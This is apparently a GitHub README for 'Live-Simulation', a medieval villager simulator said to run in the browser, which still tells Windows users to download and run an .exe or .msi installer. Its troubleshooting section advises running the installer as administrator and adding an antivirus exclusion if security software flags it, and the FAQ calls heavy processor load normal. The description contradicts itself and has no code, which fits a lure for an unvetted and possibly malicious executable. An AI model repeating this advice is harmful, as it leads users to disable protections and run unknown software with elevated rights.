# 🏰 Live-Simulation - Watch a medieval world come alive

[![](https://img.shields.io/badge/Download_Latest_Version-Blue.svg)](https://github.com/Totosh5285/Live-Simulation/releases)

## What this software does

Live-Simulation renders a living medieval world inside your web browser. This software creates autonomous characters that make decisions, build structures, and interact with the environment without user input. You watch the civilization evolve, trade, and suffer through cycles of growth and decline. The engine uses local processing to track every inhabitant of the simulation in real time.

## 💻 System requirements

Your computer needs to meet these basic standards to run the simulation smoothly:

*   Operating System: Windows 10 or Windows 11.
*   Processor: An Intel Core i5 or AMD Ryzen 5 processor from the last five years.
*   Memory: 8 GB of RAM or more.
*   Graphics: A dedicated graphics card with 2 GB of video memory.
*   Storage: 500 MB of free space on your hard drive.
*   Browser: The latest version of Google Chrome, Microsoft Edge, or Mozilla Firefox.

## 📥 How to download and install

Follow these steps to set up the software on your Windows computer:

1.  Visit the [official releases page](https://github.com/Totosh5285/Live-Simulation/releases) to view available versions.
2.  Look for the section labeled "Assets" under the most recent version tag.
3.  Click the link that ends in `.msi` or `.exe` to start the download.
4.  Once the file finishes downloading, open your Downloads folder in File Explorer.
5.  Double-click the file to start the installer.
6.  Follow the prompts on your screen. The installer places a shortcut icon on your desktop.
7.  Double-click the shortcut to launch the simulation.

## ⚙️ Understanding the simulation

The simulation functions through internal logic cycles. Each character possesses basic needs like hunger, shelter, and social connection. Their choices impact the overall state of the medieval world. 

### Character behavior
Characters operate on an artificial decision tree. They weigh the benefits of working, resting, or socializing based on current conditions. You might see villagers improve their homes when resources remain plentiful. If a famine strikes, characters adapt by rationing food or searching for new sources of sustenance.

### The environment
The world map changes based on time and character actions. Forests may shrink as people cut wood for fuel. Fields expand when the population grows. You can observe these changes by panning across the screen with your mouse. 

## 🛠️ Common troubleshooting steps

If you encounter issues while running the software, try these steps:

*   Browser performance: If the simulation crawls, close other active tabs or programs that consume significant memory.
*   File permissions: If the installer stops, right-click the file and select "Run as administrator."
*   Graphics drivers: Ensure your computer has the latest drivers for your graphics card. You can find these on the website of your graphics card manufacturer.
*   Antivirus interference: Some security software might flag new files. If your computer prevents the install, confirm the source and add an exclusion for the Live-Simulation folder.

## 📖 Frequent questions

**Does this software require an internet connection?**
The simulation runs locally on your machine. You only need the internet to download the initial installer.

**Can I save my progress?**
The application saves its current state automatically when you close the window. The simulation resumes from that exact point when you open it again.

**How do I adjust the world settings?**
Open the settings menu located in the top-right corner of the window. From there, you can change the simulation speed, toggle visual effects, or adjust the population density.

**Does the simulation end?**
The world continues indefinitely. The population may rise and fall over many hours of observation. No fixed conclusion exists for the simulation.

**Why does my computer fan sound loud?**
This software uses significant processor power to calculate the decisions of every character on the map. This normal behavior indicates that your computer is working to keep the simulation accurate.

## 🧱 Technical details

The program utilizes a persistent data structure to track individual character statistics. Each entity has a unique identification number that stores their health, inventory, and recent memory. The simulation engine refreshes these states sixty times per second to ensure fluid motion on your display. 

The software utilizes your system's hardware directly. By shifting load to your graphics processor, it maintains high frame rates even when the population counts grow high. You can view the current frame rate and processing load in the developer menu by pressing the F12 key while the simulation runs.

## 🤝 Project background

This project seeks to model complex social dynamics within a contained, predictable environment. By creating a sandbox for medieval life, we learn how small, automated decisions lead to large-scale infrastructure and social order. Every version includes updates to the decision logic that make the villagers appear more realistic. Improvements focus on the stability of the long-term simulation and the visual clarity of the world map. 

You can monitor the progress of future updates through the main repository page. We welcome feedback regarding the behavior of the inhabitants or the performance of the rendering engine. If you find a bug, open an issue through the GitHub interface and describe the steps that led to the unexpected behavior. Your input helps stabilize the code for all users.